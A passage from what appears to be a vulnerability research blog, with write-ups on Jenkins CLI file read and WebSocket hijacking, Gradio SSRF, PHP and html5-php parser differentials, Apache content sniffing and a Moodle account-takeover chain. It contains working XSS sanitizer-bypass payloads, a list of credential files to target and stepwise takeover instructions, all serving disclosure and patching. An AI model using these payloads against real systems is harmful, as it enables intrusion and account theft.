documentation](https://www.jenkins.io/doc/book/security/access-control/permissions/#overall-read), read-only access allows users to:\n\n* Access the basic Jenkins API and the API of any object they have access to.\n* Access the people directory listing user accounts and known committer identities of anyone involved in visible projects.\n* List and view all agents configured in Jenkins and access their summary pages.\n\nOn the other hand, [administrators](https://www.jenkins.io/doc/book/security/access-control/permissions/#administer) can pretty much do everything on a Jenkins instance. From an attacker's point of view, admins can run arbitrary code on a Jenkins server.\n\n# Jenkins-CLI Feature Background\n\n[Jenkins-CLI](https://www.jenkins.io/doc/book/managing/cli/) provides users with a built-in command line interface to execute custom commands that are implemented in the [hudson/cli](https://github.com/jenkinsci/jenkins/tree/jenkins-2.441/core/src/main/java/hudson/cli) directory of the Jenkins Git repository.\n\nAside from the common ways of invoking a command, using `jenkins-cli.jar` (which utilizes web sockets) or SSH, we found out that there is an additional option by sending two POST requests to `http://jenkins/cli?remoting=false`.\n\nWhen [Stapler](https://github.com/jenkinsci/stapler) (Jenkins' component that correlates a method to an endpoint) is [getting](https://github.com/jenkinsci/stapler/blob/ea4fc6ed8cd1b5eca6b4ce80b35654da9376e2bc/core/src/main/java/org/kohsuke/stapler/Stapler.java#L725) the relevant method of the *“/cli”* path, the endpoint will throw a [PlainCliEndpointResponse()](https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/cli/CLIAction.java#L195) exception, which will end up in this [generateResponse](https://github.com/jenkinsci/jenkins/blob/824f64c23e52e5c765cc7604414740aab3436f8d/core/src/main/java/jenkins/util/FullDuplexHttpService.java#L166) function:\n\n```java\npublic void generateResponse(StaplerRequest req, StaplerResponse rsp, Object node) throws IOException, ServletException {\n    try {\n        UUID uuid = UUID.fromString(req.getHeader(\"Session\"));\n        //...\n        if (req.getHeader(\"Side\").equals(\"download\")) {\n            FullDuplexHttpService service = createService(req, uuid);\n            //...\n            try {\n                service.download(req, rsp);\n            }\n            //...\n        } else {\n            FullDuplexHttpService service = services.get(uuid);\n            //...\n            try {\n                service.upload(req, rsp);\n            }\n            //...\n}\n}\n```\n\nThis function requires a downloader and uploader. The downloader returns the command’s response, and the uploader invokes a specified command from the body of the request. Jenkins connects them (downloader and uploader) using the UUID from the `​​Session` header.\n\n# Data Leak Vulnerability (CVE-2024-23897)\nWhen invoking a CLI command with arguments, we have noticed that Jenkins uses [args4j’s](https://github.com/kohsuke/args4j) [parseArgument](https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/cli/CLICommand.java#L248), which [calls](https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L479) [expandAtFiles](https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L548):\n\n```java\nprivate String[] expandAtFiles(String args[]) throws CmdLineException {\n    List<String> result = new ArrayList<String>();\n    for (String arg : args) {\n        if (arg.startsWith(\"@\")) {\n            File file = new File(arg.substring(1));\n            if (!file.exists())\n                throw new CmdLineException(this,Messages.NO_SUCH_FILE,file.getPath());\n            try {\n                result.addAll(readAllLines(file));\n            } catch (IOException ex) {\n                throw new CmdLineException(this, \"Failed to parse \"+file,ex);\n            }\n        } else {\n            result.add(arg);\n        }\n    }\n    return result.toArray(new String[result.size()]);\n}\n```\nThe function checks if the argument starts with the `@` character, and if so, it reads the file in the path after the `@` and expands a new argument for each line. \n\n<img src=\"/img/blogs/jenkins/image_2.webp\" style=\"width: 100%;\"/>\n\nThis means that if an attacker can control an argument, they can expand it to an arbitrary number of ones from an arbitrary file on the Jenkins instance.\n\nOne way an attacker could leverage this is to find a command that takes an arbitrary number of arguments and displays these back to the user. Since the arguments are populated from the contents of the file, an attacker could leak the file contents this way. We found the command [connect-to-node](https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/core/src/main/java/hudson/cli/ConnectNodeCommand.java) to be a good candidate: it receives a [list of strings as an argument](https://github.com/jenkinsci/jenkins/blob/824f64c23e52e5c765cc7604414740aab3436f8d/core/src/main/java/hudson/cli/ConnectNodeCommand.java#L46) and tries to connect to each one. If it fails, an error message is generated with the name of the failed connected node. \n\n```java\npublic class ConnectNodeCommand extends CLICommand {\n    //...\n    @Argument(metaVar = \"NAME\", usage = \"Agent name, or empty string for built-in node; comma-separated list is supported\", required = true, multiValued = true)\n    private List<String> nodes;\n    //...\n\n    @Override\n    protected int run() throws Exception {\n        //...\n        for (String node_s : hs) {\n            try {\n                Computer computer = Computer.resolveForCLI(node_s);\n                computer.cliConnect(force);\n            } catch (Exception e) {\n                //...\n                final String errorMsg = node_s + \": \" + e.getMessage();\n                stderr.println(errorMsg);\n                //...\n            }\n        }\n        //...\n    }\n}\n```\nThis [connect-to-node](https://github.com/jenkinsci/jenkins/blob/jenkins-2.441/core/src/main/java/hudson/cli/ConnectNodeCommand.java) command would usually require the CONNECT permission, which is verified in the [cliConnect](https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/model/Computer.java#L483) function. But since the exception is thrown before the permission check in the [resolveForCLI](https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/model/Computer.java#L1676) function, the command actually doesn’t require any authorizations apart from the initial [read-only verification](https://github.com/jenkinsci/jenkins/blob/3b0de10df3bedba515e13032104d4d84f83045be/core/src/main/java/hudson/cli/CLICommand.java#L247).\n\nAchieving code execution from arbitrary file read is dependent on the context. Some potentially interesting files for attackers could be:\n* SSH keys\n* /etc/passwd, /etc/shadow\n* Project secrets and credentials (refer to Jenkins' [advisory](https://www.jenkins.io/security/advisory/2024-01-24/) for more information)\n* Source code, build artifacts\n* and more… \n\n### Binary Files Reading Limitations \nWhen a file is read, the process's default character encoding is used, which is UTF-8 for most deployments. Because of this, any invalid UTF-8 sequence (statistically almost 50% of all bytes, assuming an equal distribution) would be replaced by the sequence `0xef 0xbf 0xbd` and cause data loss.\nSome other encodings (such as Windows-1252, commonly used by instances running on Windows) would make it more feasible to exfiltrate binary data.\n\n# CSWSH Vulnerability (CVE-2024-23898)\nAs mentioned earlier, one of the ways to invoke the [Jenkins-CLI](https://www.jenkins.io/doc/book/managing/cli/) commands is by web sockets (which is the implementation of `jenkins-cli.jar`).\n\nIt is known that browsers don’t enforce SOP and CORS policies on WebSockets: “Cross-origin restrictions imposed by SOP and CORS policies do not apply to WebSockets because those restrictions are placed on HTTP responses while WebSockets work over WS(WebSocket) or WSS(WebSocketSecure) protocols.” ([source](https://dev.to/pssingh21/websockets-bypassing-sop-cors-5ajm)).\n\n\n\nSince there is no Jenkins-crumb (CSRF token) nor Origin header check in the web sockets requests, any website can use [WebSockets](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API) to invoke Jenkins-CLI commands with the victim's identity, in a similar fashion to CSRF vulnerabilities.\n\n# Patch\nThe Jenkins security team patched CVE-2024-23897 by adding a secure configuration, which disables the “[expandAtFiles](https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L478)” feature.\n\n```diff\n+  public static boolean ALLOW_AT_SYNTAX = SystemProperties.getBoolean(CLICommand.class.getName() + \".allowAtSyntax\");\n//...\n-    return new CmdLineParser(this);\n+    ParserProperties properties = ParserProperties.defaults().withAtSyntax(ALLOW_AT_SYNTAX);\n+    return new CmdLineParser(this, properties);\n```\nAnd CVE-2024-23898 was patched by adding an origin verification to the WebSocket endpoint (The `ALLOW` parameter serves as a toggle, granting administrators the ability to override the updated default behavior. Giving the option to consistently permit or deny access to the WS CLI, irrespective of the Origin):\n```diff\npublic HttpResponse doWs(StaplerRequest req) {\n    if (!WebSockets.isSupported()) {\n        return HttpResponses.notFound();\n    }\n+    if (ALLOW == null) {\n+        final String actualOrigin = req.getHeader(\"Origin\");\n+        final String expectedOrigin = StringUtils.removeEnd(StringUtils.removeEnd(+Jenkins.get().getRootUrlFromRequest(), \"/\"), req.getContextPath());\n+\n+        if (actualOrigin == null || !actualOrigin.equals(expectedOrigin)) {\n+            LOGGER.log(Level.FINE, () -> \"Rejecting origin: \" + actualOrigin + \"; expected was from request: \" + +expectedOrigin);\n+            return HttpResponses.forbidden();\n+        }\n+    } else if (!ALLOW) {\n+        return HttpResponses.forbidden();\n+    }\n    Authentication authentication = Jenkins.getAuthentication2();\n\n```\n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2023/11/13 | We reported all issues to the Jenkins Security team |\n| 2023/11/13 | Maintainers acknowledged the report |\n| 2023/11/24 | Maintainers confirmed the issues |\n| 2023/12/12 | We helped the vendor verify the fix |\n| 2024/01/10 | Maintainers updated us on other attack scenarios and the classification of Critical and High for our findings |\n| 2024/01/24 | Maintainers assigned CVEs, and released [advisory](https://www.jenkins.io/security/advisory/2024-01-24/) and patch versions 2.442, and LTS 2.426.3. |\n\n# Summary\nIn this blog, we uncovered two vulnerabilities on Jenkins, the first one leverages the “[expandAtFiles](https://github.com/kohsuke/args4j/blob/fc458a24d6bd08b58fdd0bd7e37acb08200eac59/args4j/src/org/kohsuke/args4j/CmdLineParser.java#L479)” functionality to read arbitrary files and eventually execute arbitrary code on the server. The second finding has the potential to execute arbitrary commands as the victim, by manipulating them to visit a malicious link.\n\nAt Sonar, we emphasize the importance of Clean Code principles. Doing so creates software characterized by clarity, maintainability, and comprehensibility. These attributes not only help the identification and resolution of vulnerabilities throughout the development process but also lower the likelihood of introducing security weaknesses that malicious actors might exploit.\n\nLastly, we would like to give huge kudos to the Jenkins team, who quickly and professionally assessed our findings, maintained great communication throughout the disclosure process, and provided a comprehensive fix. Thank you!","tags":["java","rce","arbitrary file read","jenkins"]},{"title":"SSRF in Gradio","url":"/2023/12/20/SSRF in Gradio/","content":"# Description\nOlder versions of `gradio` contained a vulnerability in the `/file` route which made them susceptible to file traversal attacks in which an attacker could access arbitrary files on a machine running a Gradio app with a public URL (e.g. if the demo was created with `share=True`, or on Hugging Face Spaces) if they knew the path of files to look for.\n\nThis was not possible through regular URLs passed into a browser, but it was possible through the use of programmatic tools such as `curl` with the `--pass-as-is` flag.\n\nFurthermore, the `/file` route in Gradio apps also contained a vulnerability that made it possible to use it for SSRF attacks.\n\n# Explotation\nThe exploitation of this vulnerability is highly context/infrastructure dependent. We found out that it is possible to DoS the gradio’s server simply by running the following request:\n`http://gradio-domain/file=http://gradio-domain`\n\n# Mitigation\nBoth of these vulnerabilities have been fixed in `gradio==4.11.0`\n\n# References\n* [Github's Advisory](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)","tags":["ssrf","dos"]},{"title":"PHP HTML parser differential due to libxml2 lack of HTML5 support","url":"/2023/11/28/PHP HTML parser differential due to libxml2 lack of HTML5 support/","content":"### Summary\nThe default HTML parser of PHP uses the underlying package libxml2 ([for example here](https://github.com/php/php-src/blob/master/ext/dom/document.c#L1920)). Libxml2 doesn’t [currently support](https://gitlab.gnome.org/GNOME/libxml2/-/issues/211) HTML5 parsing, and while it is undergoing process, after contacting them about this matter they said it will take a while before implementing this feature. This means that the built-in HTML parser of PHP behind [loadHTML](https://www.php.net/manual/en/domdocument.loadhtml.php), [DOMImplementation](https://www.php.net/manual/en/class.domimplementation.php), etc. does not follow the same parsing rules as modern web browsers.\nThis behaviour becomes security-relevant when HTML sanitizers use the built-in HTML parser.\nWe have come across multiple PHP sanitizers that are vulnerable to bypasses due to using the built-in parser, and we think that the root cause can't be addressed without significant changes by libxml2.\n\n### PoC\nHere are some examples of how attackers can leverage these parsing differentials in order to bypass sanitizers.\n\n#### 1. Comments:\nAccording to the [XML specification](https://www.w3.org/TR/xml/#sec-comments) (XHTML), comments must end with the characters `—>`. On the other hand, the [HTML specification](https://html.spec.whatwg.org/multipage/syntax.html#comments) states that a comment's text “must not start with the string `>`, nor start with the string `->`”.\nWhen parsing the following string in a browser, the comment will end before the `p` tag. But when parsing with PHP the `p` tag will be considered `a` comment:\n```\nInput: <!--><p>\nBrowser (HTML specification) output: <!----><p></p>\nPHP parser (XHTML specification) output: <!--><p>-->\n```\nThis can be done with either `<!-->` or `<!--->`.\nAn attacker can input the following payload `<!--><xss>-->`. While the parser considers the xss tag as a comment, the browser will end the comment right before and render the xss tag as expected.\n\n#### 2. RCDATA/RAWTEXT elements\nIn [HTML5](https://html.spec.whatwg.org/#parsing-html-fragments), other element parsing types were introduced: \n* RCDATA\n    * textarea\n    * title \n* RAWTEXT\n    * noframes\n    * noembed\n    * iframe\n    * xmp\n    * style\n* OTHERS\n    * noscript - depends if [scripting](https://html.spec.whatwg.org/#the-noscript-element) is enabled (enabled by default in browsers).\n    * plaintext\n    * script\n\nWhile the PHP’s parser is oblivious to that. There are multiple ways an attacker can bypass a sanitizer due to wrong parsing such as:\n* `<iframe><!--</iframe><xss>--></iframe>`\n* `<noframes><style></noframes><xss></style></noframes>`\n* ...\n#### 3. Foreign content elements\nHTML5 introduced two foreign elements ([math](https://html.spec.whatwg.org/#mathml) and [svg](https://html.spec.whatwg.org/#svg-0)) which follow different parsing specifications than HTML. Again parsing with PHP doesn’t take it into account, causing other parsing differentials and sanitizers bypass such as:\n* `<svg><p><style><!--</style><xss>--></style>` \n* ...\n\n#### 4. DOCTYPE element\nThe `!DOCTYPE` [element in XML/XHTML](https://www.w3.org/TR/xml/#NT-doctypedecl) is more complex allowing more characters and element nesting than in [HTML5](https://html.spec.whatwg.org/#the-doctype). In contrast, the HTML doctype ends with the [first occurrence](https://html.spec.whatwg.org/#doctype-state) of the “greater than” sign `>`.\nParsing the following string will render an xss tag in the browser but not in PHP:\n* `<!DOCTYPE HTML PUBLIC \"-//W3C//DTDHTML4.01//EN\" \"><xss>\">` \n* `<!DOCTYPE HTML SYSTEM \"><xss>\">`\n\n#### 5. Element name starting with underscrool\nAccording to the [XML specification](https://www.w3schools.com/xml/xml_elements.asp#:~:text=can%20have%20attributes.-,XML%20Naming%20Rules,-XML%20elements%20must) `Element names must start with a letter or underscore`, unlike [HTML](https://html.spec.whatwg.org/#syntax-tag-name) where tags must start with ASCII alphanumerics.\n```\nInput: <p><_test>/<p>\nHTML output: <p>&lt;_test/&gt;/<p>\nXML output: <p><_test/>/<p>\n```\n\n### Impact\nSanitizers using the built-in PHP parser are inherently vulnerable to bypass due to wrong parsing.\n\n### Recommendation\nThis issue is [known](https://wiki.php.net/rfc/domdocument_html5_parser) but isn't clear for users of PHP, after this report the PHP team added a red warning to the documentation:\n\n* [loadhtml](https://www.php.net/manual/en/domdocument.loadhtml.php)\n* [loadhtmlfile](https://www.php.net/manual/en/domdocument.loadhtmlfile.php)\n* [Commit](https://github.com/php/doc-en/commit/4ef716f8aa753e1189b2e57c91da378b16d970b0)","tags":["xss","mxss","bypass","parser differential"]},{"title":"Masterminds/html5-php parser differential","url":"/2023/11/13/Masterminds html5-php parser differential/","content":"## Observations\nWe have noticed a number of parsing differences between the Masterminds/html5-php parser and the HTML5 specification. We think that the root cause of those issues drills down to the [use](https://github.com/Masterminds/html5-php/blob/master/src/HTML5/Parser/DOMTreeBuilder.php#L172) of PHP’s default parser, [loadHTML](https://www.php.net/manual/en/domdocument.loadhtml.php), [DOMImplementation](https://www.php.net/manual/en/class.domimplementation.php), etc. The lack of HTML5 support by PHP is [known](https://wiki.php.net/rfc/domdocument_html5_parser) and we contacted them asking to make it more clear in the [documentation](https://www.php.net/manual/en/domdocument.loadhtml.php) in order to raise awareness for these security issues.\nThis behavior becomes security-relevant when HTML sanitizers use the Masterminds/html5-php parser. We have come across multiple PHP sanitizers that are vulnerable to bypasses due to using Masterminds/html5-php.\n\n## Exploitation\nHere are examples of the differentials, and how attackers can leverage these in order to bypass sanitizers.\n\n### Comments:\nAccording to the [XML specification](https://www.w3.org/TR/xml/#sec-comments) (XHTML), comments must end with the characters `-->`.\nOn the other hand, the [HTML specification](https://html.spec.whatwg.org/multipage/syntax.html#comments) states that a comment's text _'must not start with the string `>`, nor start with the string `->`'_.\nWhen parsing the following string in a browser, the comment will end before the `p` tag. But when parsing with `Masterminds/html5-php` the `p` tag will be considered a comment:\n* Input: `<!---><p>`\n* Browser (HTML5 specification) output: `<!----><p></p>`\n* Masterminds/html5-php parser output: `<!---><p>-->`\n\nAn attacker can input the following payload `<!---><xss>-->`. While the parser considers the `xss` tag as a comment, the browser will end the comment right before and render the `xss` tag as expected.\n\n### Processing instructions (PI) elements ([known](https://github.com/Masterminds/html5-php#known-issues-or-things-we-designed-against-the-spec), but we encounter sanitizer bypasses due to this)\nProcessing instructions elements exist in [XML specification](https://www.w3.org/TR/xml/#sec-pi) but in [HTML5](https://html.spec.whatwg.org/#determining-the-character-encoding:~:text=A%20sequence%20of%20bytes%20starting%20with%3A%200x3C%200x3F%20(%60%3C%3F%60)) the characters `<?` opens a comment and ends it at the first occurrence of greater than `>`.\n\nAttackers can create the following Processing Instruction `<?xml >s<img src=x onerror=alert(1)> ?>` and while no `img` tag is rendered in Masterminds/html5-php the browser will create a comment and end it at the first `>` character, rendering the `img` tag.\n\n### Foreign content elements\nHTML5 introduced two foreign elements ([math](https://html.spec.whatwg.org/#mathml) and [svg](https://html.spec.whatwg.org/#svg-0)) which follow different parsing specifications than HTML. Masterminds/html5-php doesn’t take it into account, causing other parsing differentials and [sanitizers bypass](https://research.securitum.com/dompurify-bypass-using-mxss/) such as:\n* `<svg><p><style><!--</style><xss>--></style>`\n\n### `noscript` element\nDepending if [scripting](https://html.spec.whatwg.org/#the-noscript-element) is enabled (enabled by default in browsers) the `noscript` element parses its content differently:\n* If scripting is enabled, then the content is rendered as raw data\n* If scripting is disabled, then the content is rendered as HTML\n\nMasterminds/html5-php parses according to disabled scripting, which is different than the default browsers’ parsing.\nThis is not wrong per se, but still can cause some [mXSS](https://cure53.de/fp170.pdf) such as:\n`<noscript><p alt=\"</noscript><img src=x onerror=alert(1)>\">`","tags":["xss","mxss","bypass","parser differential"]},{"title":"Typo3 HTML Sanitizer By-passing via the processing instructions","url":"/2023/11/13/Typo3 HTML Sanitizer By-passing via the processing instructions/","content":"# Problem\nDOM processing instructions are not handled correctly. This allows bypassing the cross-site scripting mechanism of [typo3/html-sanitizer](https://packagist.org/packages/typo3/html-sanitizer).\n\n\n# Solution\nUpdate to `typo3/html-sanitizer` versions 1.5.3 or 2.1.4 that fix the problem described.\n\n# Credits\nThanks to Yaniv Nizry and Niels Dossche who reported this issue, and to TYPO3 core & security team member Oliver Hader who fixed the issue.\n\n# References\n* [TYPO3-CORE-SA-2023-007](https://typo3.org/security/advisory/typo3-core-sa-2023-007)\n* [Disclosure & PoC](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-652v-xw37-rvw7) (embargoed +90 days)\n","tags":["xss","bypass"]},{"title":"Apache httpd Stored XSS by design","url":"/2023/11/04/Apache httpd XSS by design/","content":"# Introduction\nApproximately one year ago in 2022, I took part in a Capture The Flag (CTF) challenge with the objective of achieving Remote Code Execution (RCE). While tackling the challenge, I observed an unusual behavior that allowed for a Stored Cross-Site Scripting (XSS) attack by uploading a file, regardless of its extension. Upon closer investigation, I uncovered that the *\"quirk\"* was rooted in the Apache HTTP Server.\n\n# TL;DR\nBy default, Apache httpd does not include the \"no-sniff\" header, `X-Content-Type-Options: nosniff`, and it does not perform automatic content type detection for files that lack a name or have only dots as their name, regardless of the file extension. For instance, a file named `.jpg` or `...jpg` would serve without any content type causing the browser to *\"sniff\"* the content, unlike files such as `test.jpg` which will result in `Content-type: image/jpeg`. This means that if an attacker has the capability to upload a file with no name or a name consisting solely of dots, it becomes possible to exploit a stored XSS vulnerability, regardless of the file extension's constraints.\n\n<img src=\"/img/blogs/httpd/Image-1.png\" style=\"width: 100%;\"/>\n\n# Background\n## Content-type\n\nIn HTTP (Hypertext Transfer Protocol), the `Content-Type` header is used to indicate the media type or MIME (Multipurpose Internet Mail Extensions) type of the data that is being sent in the HTTP response. It specifies the format of the content being returned by the server so that the client (e.g., a web browser) knows how to properly interpret and display the data.\n\nHere are some examples of common media types:\n\n* `text/html`: Indicates that the content is HTML text.\n* `text/plain`: Indicates that the content is plain text.\n* `application/json`: Indicates that the content is JSON data.\n* `application/xml`: Indicates that the content is XML data.\n* `image/jpeg`, `image/png`, `image/gif`: Indicate that the content is an image in various formats.\n\nThis header is crucial for the client to interpret the received data correctly. If the client doesn't recognize or support the specified Content-Type, it may not be able to process the content as intended.\n\n## Content-type Sniffing\nContent-Type sniffing, is a behavior that web browsers and other user agents sometimes exhibit when they receive a resource with an ambiguous or missing Content-Type header. Content-Type sniffing involves the user agent trying to determine the media type of the resource by inspecting its actual content. \n\nThe purpose of content-type sniffing is to improve the user experience by attempting to render the content in a way that makes sense to the user. However, it can also introduce security risks. For example, if an attacker can control the content of a resource and trick the browser into interpreting it as a different media type, and might lead to security vulnerabilities.\n\nTo mitigate these risks, modern browsers provide web developers the ability to to disable content sniffing by adding the header: `X-Content-Type-Options: nosniff`.\n\nContent-Type sniffing should not be relied upon for determining the media type of a resource. Instead, it's best practice to always set the correct Content-Type header on the server side to ensure that the browser and other user agents can correctly process the content.\n\n# Apache's response \nAfter reaching the maintainers of Apache httpd, they replied that this is the expected behavior of [mod_mime](https://httpd.apache.org/docs/2.4/mod/mod_mime.html) \\(the component that generates a content-type according to a file\\).\n\n# References\n* [X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)\n* [Content-Type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)\n* [mod_mime](https://httpd.apache.org/docs/2.4/mod/mod_mime.html)\n* [Tweet](https://twitter.com/YNizry/status/1582733545759330306)\n","tags":["apache","content-type","xss"]},{"title":"HtmlSanitizer vulnerable to Cross-site Scripting in Foreign Content","url":"/2023/10/03/HtmlSanitizer vulnerable to Cross-site Scripting in Foreign Content/","content":"# Impact\nThe vulnerability occurs in configurations where foreign content is allowed, i.e. either `svg` or `math` are in the list of allowed elements.\nSpecifically, the requirements for the vulnerability are:\n\n1. Allowing one foreign element: `svg`, or `math`\n2. Comments or one raw text element: `iframe`, `noembed`, `xmp`, `title`, `noframes`, `style` or `noscript`\n\nConfigurations that meet the above requirements plus the following are vulnerable to an additional vulnerability:\n\n* Any HTML integration element: `title`, `desc`, `mi`, `mo`, `mn`, `ms`, `mtext`, `annotation-xml`.\n\nIn case an application sanitizes user input with a vulnerable configuration, an attacker could\nbypass the sanitization and inject arbitrary HTML, including JavaScript code.\n\nNote that in the default configuration the vulnerability is not present.\n\n# Patches\nThe vulnerability has been fixed in versions 8.0.723 and 8.1.722-beta (preview version).\n\n# Workarounds\nDisallow foreign elements `svg` and `math`. This is the case in the default configuration, which is therefore not affected by the vulnerability.\n\n# References\n* [GHSA-43cp-6p3q-2pc4](https://github.com/mganss/HtmlSanitizer/security/advisories/GHSA-43cp-6p3q-2pc4)\n* [mganss/HtmlSanitizer@ab29319](https://github.com/mganss/HtmlSanitizer/commit/ab29319866c020f0cc11e6b92228cd8039196c6e)\n* https://nvd.nist.gov/vuln/detail/CVE-2023-44390\n\n","tags":["xss","mxss","bypass"]},{"title":"Playing Dominos with Moodle's Security (2/2)","url":"/2023/08/28/Playing Dominos with Moodle's Security 2/","content":"# Introduction\nIn our endeavor to enhance the security of the open-source realm and gain a deeper understanding of real-world vulnerabilities, we are constantly conducting audits of open-source projects, and the outcomes of this are presented in our two articles on Moodle security. This is the second blog covering another critical finding we discovered when auditing Moodle for security vulnerabilities. \n\nIn the first blog, we demonstrated how an unauthorized attacker could turn an arbitrary folder creation into a Cross-Site Scripting (XSS) vulnerability, ultimately resulting in Remote Code Execution (RCE). The second part of the series follows the same line of starting with a considerably low-impact bug at first glance, but with some steps, attackers can leverage it to a full account takeover. \n\n# Impact\nMoodle versions before 4.2.2, 4.1.5, 4.0.10, 3.11.16, and 3.9.23 are susceptible to Account Takeover (ATO) via self-XSS in the WYSIWYG editor – this is tracked as CVE-2023-40320. On Moodle instances where [OAuth](https://en.wikipedia.org/wiki/OAuth) authentication is enabled, victims' accounts can be compromised with a simple click on a link.\n\n<iframe width=\"100%\" height=\"414\" src=\"https://www.youtube.com/embed/njeXbu85yzM\" title=\"Demonstration of Moodle vulnerabilities (CVE-2023-40320) on a test instance\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" allowfullscreen></iframe>\n\n# Technical Details\nIn this section, we will discuss the technical details of the vulnerability and explain how attackers might exploit this kind of vulnerability.\n\n## Background\nA self-XSS vulnerability is when an attacker can execute arbitrary JavaScript code but the only one being affected by it is the attacker itself. To exploit this type of XSS, an attacker usually would need a high level of victim interaction, such as copying and pasting the payload to the vulnerable website. In many cases, this issue would not be considered a vulnerability, and even in the case of the Moodle vulnerability disclosure program, self-XSS is [out of scope](https://moodle.org/mod/page/view.php?id=8722#:~:text=Self%2DXSS%20(unless%20there%20is%20a%20proven%20impact%20on%20other%20users)) **“(unless there is a proven impact on other users).”**\n\n# From Self-XSS to Account Takeover (CVE-2023-40320)\nOne of the initial steps we do when auditing an application is to use it as intended. Doing so helps us understand how it is supposed to behave and also brings many ideas to mind on how to manipulate the intended behavior the same way an attacker would. Pretty quickly we ran into the WYSIWYG editor in Moodle. \n\nBeing one of the core features of Moodle, it appears when editing a description of a user, writing an answer to a forum, submitting assignments, and many more.\n\nWe noticed that there is the possibility to input arbitrary HTML which will be rendered and executed in the editor (making this a self-XSS). But when submitting the payload to a public page (such as a forum, assignment, etc.), it gets sanitized on the server side and dangerous elements are removed – other users will never be affected by the payload. \n\n<img src=\"/img/blogs/Moodle/image-2.webp\" style=\"width: 100%;\"/>\n\nIn addition, the editor has a feature that automatically saves a user's WYSIWYG content by sending the unsanitized data periodically after a couple of seconds to the `/lib/editor/atto/autosave-ajax.php` endpoint:\n\n<img src=\"/img/blogs/Moodle/image-3.webp\" style=\"width: 100%;\"/>\n\nWhen loading the page again, the autosaved data is fetched from the same endpoint using the `actions[0][action]` parameter set to `resume`. In case a malicious payload was stored before, it will execute again by visiting the WYSIWYG page – this just became a Stored Self-XSS!\n\n# Exploitation strategies\nOne of the ways an attacker could leverage this type of bug to an impactful one is by manipulating a victim into logging in to a malicious account -> triggering the self-XSS -> raising the impact depending on the application. With it, this was the first exploitation idea we tested. After a small check, we saw that the login and logout features are CSRF-protected, meaning an attacker can’t log in or out on the victim’s behalf by manipulating them to visit a malicious website. \n\nIn this case, an attacker needs to find some kind of “magic link” (a single link that logs in a user without a password, usually using a one-time token). The first idea we wanted to test is via an OAuth login. Yet again this endpoint was protected by a GET parameter `sesskey` which acts as a CSRF token. At this point, we decided that code auditing would yield better results than quick tests. \n\nFollowing the normal login procedure, the function that logs in a user is called `complete_user_login`. This function is called after the authentication is verified and would also log out the current user if there is one. Upon examining all the calls made to this function, we discovered several endpoints. However, we observed that they either verifying new accounts (Moodle accounts must be verified before users can access them, meaning an attacker can’t pre-deploy the self-XSS) or prohibited logging in if a session already existed. Changing the email of an existing account would send a confirmation message but the link provided only confirms and does not login, unlike the confirmation link when registering a new account.\n\n# OAuth Authentication Flows\nBut then we came across `auth/oauth2/confirm-linkedlogin.php` \n\n```php\n$token = required_param('token', PARAM_RAW);\n$username = required_param('username', PARAM_USERNAME);\n$userid = required_param('userid', PARAM_INT);\n$issuerid = required_param('issuerid', PARAM_INT);\n$redirect = optional_param('redirect', '', PARAM_LOCALURL);    // Where to \n//...\n$confirmed = \\auth_oauth2\\api::confirm_link_login($userid, $username, $issuerid, $token);\n\n\nif ($confirmed) {\n//...\n   if (!$user->suspended) {\n       complete_user_login($user);\n    //...\n       if (!empty($redirect)) {\n           redirect($redirect);\n       }\n//...\n```\n\nHere, if the link is valid, a login will happen. Without any verification that another user is already logged in, this is the only endpoint that does that. In addition to that, there is the possibility to pass a local `$redirect` URL that will redirect the user after the login!\n\nBut what is `oauth2/confirm-linkedlogin.php` and how an attacker would get here?\nFirst, we need to understand that this is possible only in a Moodle instance with some kind of OAuth enabled. In it, a user can log in via their OAuth account or link/unlink OAuth to an existing account. In case it's the first OAuth login a new account will be created with linked OAuth. **But** in case there is already an account with the same email address as the OAuth account, Moodle will link those accounts and send this `confirm-linkedlogin` confirmation link by email.\n\n<img src=\"/img/blogs/Moodle/image-4.webp\" style=\"width: 100%;\"/>\n\n# Exploitation\nHere are the specific number of steps an attacker would need to do to craft an account takeover attack:\n\n1. The attacker has an account with a controlled email same as the OAuth provider (for example, if Moodle has Google’s OAuth then the email should be a Gmail address). In this demonstration, let's say an attacker is logged in with attacker@gmail.com. \n\n2. The attacker’s account shouldn’t be linked to OAuth (can be unlinked in the user options in case it's already linked).\n\n3. Attacker creates a self-XSS payload that logs in using the current browser’s OAuth (done automatically without requiring credentials) using an iframe pointing to:\n`/auth/oauth2/login.php?id=2&wantsurl=%2F&sesskey=${M.cfg.sesskey}` (the `M.cfg.sesskey` is the current session’s CSRF protection). Since the Iframe has the same origin as the main page, the XSS code can freely access the newly created session in the Iframe.\n\n4. An attacker account adds the self-XSS payload to a WYSIWYG input and waits for the autosave.\n\n5. Attacker logs out.\n\n6. The attacker logs in with **OAuth** (using attacker@gmail.com). Moodle will see that there is already an account with the same email address and will generate a confirmation URL that links the Moodle account to the OAuth. That URL will be sent by email. \n\n7. Attacker adds the `redirect` parameter to the URL that will point to the self-XSS containing page: `http://moodle-domain/auth/oauth2/confirm-linkedlogin.php?token=...&userid=11&username=...&issuerid=...&redirect=http://moodle-domain/user/edit.php?id=11%231`\n\n8. Any user who clicks on the newly crafted link will be logged in to the attacker’s account and redirected to the self-XSS 